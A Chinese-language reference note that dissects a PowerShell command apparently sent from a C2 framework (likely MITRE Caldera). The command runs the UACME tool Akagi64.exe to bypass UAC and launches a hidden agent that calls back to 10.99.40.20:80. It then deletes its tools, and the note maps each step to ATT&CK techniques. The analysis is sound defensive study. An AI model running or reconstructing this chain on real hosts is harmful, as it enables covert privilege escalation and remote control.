---
created: 2026-07-18 21:07
updated: 2026-07-18 21:07
tags: []
type: reference
lang: en
status: draft
---
這段截圖顯示的是一個 **C2（Command and Control，命令與控制）** 伺服器（從介面風格來看非常像是 **MITRE Caldera** 框架）向受控端主機（Agent）下達的一段 PowerShell 指令（`executor='psh'`）。

這個指令的核心目的非常明確：**利用 UAC 繞過（UAC Bypass）工具提升權限，並在背景執行一個高權限的惡意程式（或後門），最後刪除工具以隱匿痕跡。**

以下為您逐行拆解與詳細解釋這段指令的運作流程：

## 🛠️ 指令逐行解析

這段 PowerShell 指令利用分號（`;`）串聯了多個動作，我們可以將它拆解為以下幾個步驟：

### 1. 變數設定與環境準備

- `$p = Get-Location;`
    
    - **解釋**：獲取目前 PowerShell 所在的作業目錄，並存入變數 `$p`。
        
- `$ak = "$p\Akagi64.exe";`
    
    - **解釋**：定義 UAC 繞過工具 `Akagi64.exe` 的完整路徑。
        

### 2. 建立二次產生的惡意腳本 (`agent.ps1`)

- `"cd C:\Users\Public;C:\Users\Public\SELDownloadHelper.exe -server [http://10.99.40.20:80](http://10.99.40.20:80)" > agent.ps1;`
    
    - **解釋**：在目前目錄下建立一個名為 `agent.ps1` 的新腳本檔案，並將引號內的指令寫入其中。
        
    - **該腳本內容為**：切換到公用資料夾 `C:\Users\Public`，然後執行 `SELDownloadHelper.exe`，並將其連線指向 C2 伺服器 `[http://10.99.40.20:80](http://10.99.40.20:80)`。這通常是攻擊者真正想要維持權限或進行下一步控制的 Agent 程式。
        
- `$ag = "$p\agent.ps1";`
    
    - **解釋**：將剛剛建立的 `agent.ps1` 完整路徑存入變數 `$ag`。
        

### 3. 執行 UAC 繞過（權限提升）

- `.\Akagi64.exe 7 "powershell.exe -w hidden $ag";`
    
    - **解釋**：這是整段指令的最核心部分。
        
    - `Akagi64.exe` 是知名開源 UAC 繞過工具 **UACME** 的 64 位元編譯版本。
        
    - 參數 `7` 代表使用 UACME 中的 **Method 7**（一種特定的 Windows 權限提升與 UAC 繞過技術）。
        
    - 後面跟隨的字串，則是繞過 UAC 後要以**系統管理員（Administrator）最高權限**執行的指令。這裡它啟動了一個視窗隱藏（`-w hidden`）的 PowerShell，去執行剛才建立的 `$ag`（即 `agent.ps1`）。
        

### 4. 延遲與清理痕跡（Defense Evasion）

- `Start-Sleep -Seconds 120;`
    
    - **解釋**：讓主要的 PowerShell 執行緒暫停（睡眠）120 秒（2 分鐘）。這是為了確保 `Akagi64.exe` 有足夠的時間完成權限提升，且 `SELDownloadHelper.exe` 已經成功在背景啟動並回連。
        
- `rm $ak; rm $ag;`
    
    - **解釋**：`rm` 是 `Remove-Item` 的別名。當兩分鐘過去後，立刻刪除 `Akagi64.exe`（`$ak`）與 `agent.ps1`（`$ag`）。這是典型的防禦規避（Defense Evasion）手法，用來銷毀留在硬碟上的應急工具，增加藍隊（資安維運人員）事後數位鑑識的難度。
        

## 🔍 關鍵惡意技術總結（MITRE ATT&CK 映射）

- **特權提升（Privilege Escalation）/ 繞過使用者帳戶控制 (T1548.002):** 利用 `Akagi64.exe` (UACME) 繞過 Windows 的 UAC 機制，直接獲取高權限。
    
- **防禦規避（Defense Evasion）/ 隱藏視窗 (T1564.003):** 在執行 PowerShell 時使用 `-w hidden` 參數，不讓受害者畫面上彈出命令提示字元視窗。
    
- **防禦規避（Defense Evasion）/ 刪除構件 (T1070.004):** 最後使用 `rm` 刪除落地（Dropped）的工具與腳本檔案。
    
- **命令與控制（Command and Control）(T1071.001):** 透過 `SELDownloadHelper.exe` 向內網或外網的 IP `10.99.40.20:80` 建立標準 HTTP(S) 通訊，聽取下一步指令。

